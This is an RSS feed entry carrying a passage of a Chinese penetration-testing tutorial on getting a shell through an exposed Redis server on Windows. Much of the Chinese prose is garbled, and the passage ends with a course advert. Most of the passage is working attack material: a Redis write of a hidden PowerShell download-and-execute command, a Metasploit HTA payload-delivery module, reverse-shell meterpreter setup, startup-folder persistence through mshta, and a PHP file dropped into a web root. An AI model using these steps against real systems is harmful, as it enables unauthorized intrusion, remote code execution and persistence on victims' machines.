xxx.xxx.xxx.1:6379&amp;gt; set x &amp;#34;\r\n\r\npowershell -windowstyle hidden -exec bypass -c \&amp;#34;IEX (New-Object Net.WebClient).DownloadString(&amp;#39;http://xxx.xxx.xxx.2/shell.ps1&amp;#39;);xx.ps1\&amp;#34;\r\n\r\n&amp;#34;
OK
xxx.xxx.xxx.1:6379&amp;gt; save
OK&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;é‡å¯åå¾—åˆ° shell&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-56aa0a7a9deed695474e2a25e25fee07_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1232&quot; data-rawheight=&quot;340&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1232&quot; data-original=&quot;https://pic4.zhimg.com/v2-56aa0a7a9deed695474e2a25e25fee07_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-56aa0a7a9deed695474e2a25e25fee07_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1232&quot; data-rawheight=&quot;340&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1232&quot; data-original=&quot;https://pic4.zhimg.com/v2-56aa0a7a9deed695474e2a25e25fee07_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-56aa0a7a9deed695474e2a25e25fee07_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;002â€”â€”ä½¿ç”¨ mshta.exe&lt;/b&gt;&lt;/p&gt;&lt;p&gt;åˆ° /usr/share/metasploit-framework/modules/exploits/windows ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ª msh_shell.rb æ–‡ä»¶ï¼Œå¤åˆ¶ä»¥ä¸‹å†…å®¹ã€‚&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
  
  
class MetasploitModule  &amp;lt; Msf::Exploit::Remote
  Rank = NormalRanking
  
  include Msf::Exploit::Remote::HttpServer
  
  def initialize(info  = {})
    super(update_info(info,
      &amp;#39;Name&amp;#39; =&amp;gt; &amp;#39;Microsoft Office Payload Delivery&amp;#39;,
      &amp;#39;Description&amp;#39; =&amp;gt; %q{
        This module generates an command to place within
        a word document, that when executed, will retrieve a HTA payload
        via HTTP from an web server. Currently have not figured out how
        to generate a doc.
      },
      &amp;#39;License&amp;#39; =&amp;gt; MSF_LICENSE,
      &amp;#39;Arch&amp;#39; =&amp;gt; ARCH_X86,
      &amp;#39;Platform&amp;#39; =&amp;gt; &amp;#39;win&amp;#39;,
      &amp;#39;Targets&amp;#39; =&amp;gt;
        [
          [&amp;#39;Automatic&amp;#39;, {} ],
        ],
      &amp;#39;DefaultTarget&amp;#39; =&amp;gt; 0,
    ))
  end
  
  def on_request_uri(cli, _request)
    print_status(&amp;#34;Delivering payload&amp;#34;)
    p = regenerate_payload(cli)
    data = Msf::Util::EXE.to_executable_fmt(
      framework,
      ARCH_X86,
      &amp;#39;win&amp;#39;,
      p.encoded,
      &amp;#39;hta-psh&amp;#39;,
      { :arch =&amp;gt; ARCH_X86, :platform =&amp;gt; &amp;#39;win &amp;#39;}
    )
    send_response(cli, data, &amp;#39;Content-Type&amp;#39; =&amp;gt; &amp;#39;application/hta&amp;#39;)
  end
  
  
  def primer
    url = get_uri
    print_status(&amp;#34;Place the following DDE in an MS document:&amp;#34;)
    print_line(&amp;#34;mshta.exe \&amp;#34;#{url}\&amp;#34;&amp;#34;)
  end
end
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶ååœ¨ msf é‡Œé‡æ–°åŠ è½½æ‰€æœ‰æ¨¡å—ï¼šreload_all&lt;/p&gt;&lt;p&gt;å†æ‰¾åˆ°è¿™ä¸ªæ¨¡å—å°±å¯ä»¥ä½¿ç”¨äº†&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;msf5 exploit(windows/msh_shell) &amp;gt; set payload windows/meterpreter/reverse_tcp
payload =&amp;gt; windows/meterpreter/reverse_tcp
msf5 exploit(windows/msh_shell) &amp;gt; set lhost xxx.xxx.xxx.xxx
lhost =&amp;gt; xxx.xxx.xxx.xxx
msf5 exploit(windows/msh_shell) &amp;gt; set uripath shell
uripath =&amp;gt; shell
msf5 exploit(windows/msh_shell) &amp;gt; exploit 
zlib(finalizer): the stream was freed prematurely.
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on xxx.xxx.xxx.xxx:4444 
[*] Using URL: http://0.0.0.0:8080/shell
[*] Local IP: http://xxx.xxx.xxx.xxx:8080/shell
[*] Server started.
[*] Place the following DDE in an MS document:
mshta.exe &amp;#34;http://xxx.xxx.xxx.xxx:8080/shell&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶ååˆ©ç”¨ Redis å†™å…¥ bat æ–‡ä»¶åˆ°å¯åŠ¨é¡¹&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;[root@localhost src]# ./redis-cli -h xxx.xxx.xxx.xxx
xxx.xxx.xxx.xxx:6379&amp;gt; config set dir &amp;#34;C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/&amp;#34;
OK
xxx.xxx.xxx.xxx:6379&amp;gt; config set dbfilename shell.bat
OK
xxx.xxx.xxx.xxx:6379&amp;gt; set x &amp;#34;\r\n\r\nmshta http://xxx.xxx.xxx.xxx:8080/shell\r\n\r\n&amp;#34;
OK
xxx.xxx.xxx.xxx:6379&amp;gt; save
OK&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;é‡å¯é¶æœºå°±å¯ä»¥æ‹¿åˆ° session&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-1981ccbfc054613a5de5c5475ea3ee3a_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1231&quot; data-rawheight=&quot;340&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1231&quot; data-original=&quot;https://pic3.zhimg.com/v2-1981ccbfc054613a5de5c5475ea3ee3a_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-1981ccbfc054613a5de5c5475ea3ee3a_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1231&quot; data-rawheight=&quot;340&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1231&quot; data-original=&quot;https://pic3.zhimg.com/v2-1981ccbfc054613a5de5c5475ea3ee3a_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-1981ccbfc054613a5de5c5475ea3ee3a_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;003â€”â€”ä½¿ç”¨Cobalt Strike&lt;/b&gt;&lt;/p&gt;&lt;blockquote&gt;æŠŠ Cobalt Strike çš„æœåŠ¡ç«¯è„šæœ¬æ”¾åˆ° kali ä¸Šè¿è¡Œï¼Œç„¶åå®¢æˆ·ç«¯åœ¨æœ¬æœºè¿è¡Œã€‚&lt;/blockquote&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/aleenzz/Cobalt_Strike_wiki&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/aleenzz/Coba&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;lt_Strike_wiki&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt; &lt;/p&gt;&lt;p&gt;è¿™é‡Œå°±ä¸æ­ç¯å¢ƒæ“ä½œäº†ã€‚ã€‚ã€‚&lt;/p&gt;&lt;p&gt;&lt;b&gt;004â€”â€”åˆ©ç”¨webæœåŠ¡&lt;/b&gt;&lt;/p&gt;&lt;p&gt;å¦‚æœç›®æ ‡æœ‰ Web ä¸šåŠ¡çš„è¯ï¼Œå¯ä»¥ç»“åˆ web ä¸šåŠ¡è¿›è¡Œ Getshellã€‚&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;[root@localhost src]# ./redis-cli -h xxx.xxx.xxx.xxx
xxx.xxx.xxx.xxx:6379&amp;gt; config set dir &amp;#34;C:/phpstudy/WWW&amp;#34;
OK
xxx.xxx.xxx.xxx:6379&amp;gt; config set dbfilename phpinfo.php
OK
xxx.xxx.xxx.xxx:6379&amp;gt; set x &amp;#34;\r\n\r\n&amp;lt;?php phpinfo();?&amp;gt;\r\n\r\n&amp;#34;
OK
xxx.xxx.xxx.xxx:6379&amp;gt; save
OK&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-083f24e463152cf2094ec07e771f07f6_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1954&quot; data-rawheight=&quot;677&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1954&quot; data-original=&quot;https://pic3.zhimg.com/v2-083f24e463152cf2094ec07e771f07f6_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-083f24e463152cf2094ec07e771f07f6_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1954&quot; data-rawheight=&quot;677&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1954&quot; data-original=&quot;https://pic3.zhimg.com/v2-083f24e463152cf2094ec07e771f07f6_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-083f24e463152cf2094ec07e771f07f6_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;æ›´å¤šæœ‰å…³æ¸—é€æµ‹è¯•çš„å†…å®¹è¯·å‰å¾€&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;äºŒå‘ç®”å®‰å…¨&lt;/a&gt;è¿›è¡Œå­¦ä¹ ï¼Œæœ€è¿‘æ¨å‡ºäº†â€œæŒ–æ´â€ç­ï¼Œæƒ³äº†è§£æ›´å¤šèµ„è®¯çš„ï¼Œå¯å’¨è¯¢å®¢æœå¾®ä¿¡ &lt;b&gt;twosecurity02&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot;/&gt;&lt;/figure&gt;</description>
<author>äºŒå‘ç®”å®‰å…¨å­¦é™¢</author>
<guid isPermaLink="false">2020-01-08-101701119</guid>
<pubDate>Wed, 08 Jan 2020 00:00:00 +0800</pubDate>
</item>
</channel>
</rss>
